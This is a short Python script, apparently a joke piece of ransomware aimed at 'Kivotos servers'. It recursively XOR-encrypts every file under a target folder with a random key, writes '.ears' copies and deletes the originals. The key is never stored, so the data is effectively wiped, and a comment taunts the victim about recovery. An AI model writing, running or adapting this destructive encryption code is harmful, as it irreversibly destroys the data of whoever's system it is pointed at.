import os
from pathlib import Path
from itertools import cycle

target = Path("./test/") #target: Kivotos servers

def destroy(file: Path, key: bytes) -> None:
    with open(file, "rb") as f:
        oryginal = f.read()

    encrypted = bytes(e ^ a for e, a in zip(oryginal, cycle(key)))

    with open(f"{file}.ears", "wb") as f:
        f.write(encrypted) #create encrypted file

    print(f"Encrypted {file.name}")
    file.unlink() #delete oryginal file


if __name__=="__main__":
    #good luck with retrieving files, cat-girs and fox-girls won't live together in harmony
    key = os.urandom(16)
    #print(f"Key: {key.hex(" ")}\n")

    print("Encrypting files...")
    for file in target.rglob("*"):
        if file.is_file():
            destroy(file, key)